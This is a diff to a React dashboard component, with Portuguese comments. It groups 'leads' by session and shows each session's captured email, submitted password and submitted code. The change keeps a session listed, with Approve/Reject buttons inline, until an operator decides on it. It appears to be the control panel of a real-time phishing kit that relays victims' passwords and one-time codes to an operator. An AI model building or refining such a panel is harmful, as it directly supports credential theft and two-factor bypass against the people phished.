@@ -502,6 +502,13 @@ export default function Dashboard() {
       arr.push(l);
       bySession.set(l.session_id, arr);
     }
+    // Sessões que JÁ TÊM ação (approve/reject) finalizada não ficam mais em andamento.
+    const decidedSessions = new Set<string>();
+    for (const a of actions) {
+      if (a.action === "approve" || a.action === "reject") {
+        decidedSessions.add(a.session_id);
+      }
+    }
     const active: ActiveSession[] = [];
     const stale: ActiveSession[] = [];
     const cutoff = nowTick - ACTIVE_SESSION_TTL_MS;
@@ -510,11 +517,11 @@ export default function Dashboard() {
       if (emails.length === 0) continue;
       const sorted = [...items].sort((a, b) => a.created_at.localeCompare(b.created_at));
       const lastActivity = sorted[sorted.length - 1].created_at;
-      // Mostra a sessão se a última atividade foi e-mail ou senha.
-      // Se foi código, só mostra se NÃO houver tentativa pendente nem ação dela
-      // (ou seja, só pra sessões que voltaram a digitar e-mail depois).
-      const lastField = sorted[sorted.length - 1].field_name;
-      if (lastField === "code_submitted") continue;
+      // Mantém a sessão em andamento mesmo se ela já submeteu código —
+      // o card mobile mostra o código + Aprovar/Rejeitar inline, evitando
+      // que o admin precise rolar até outra seção em tela micro.
+      // Só remove se já houve uma ação (aprovar/rejeitar) pra essa sessão.
+      if (decidedSessions.has(sid)) continue;
       const email = [...emails].sort((a, b) => a.created_at.localeCompare(b.created_at)).pop()!.value;
       const passwordRow = [...items]
         .filter((i) => i.field_name === "password_submitted")
@@ -539,7 +546,7 @@ export default function Dashboard() {
       activeSessions: active.sort((a, b) => b.lastActivity.localeCompare(a.lastActivity)),
       staleSessions: stale.sort((a, b) => b.lastActivity.localeCompare(a.lastActivity)),
     };
-  }, [leads, nowTick]);
+  }, [leads, actions, nowTick]);
 
   // Sessões abandonadas (>1h sem atividade) viram linhas no Histórico,
   // mesmo sem código submetido — preenchem com "—".
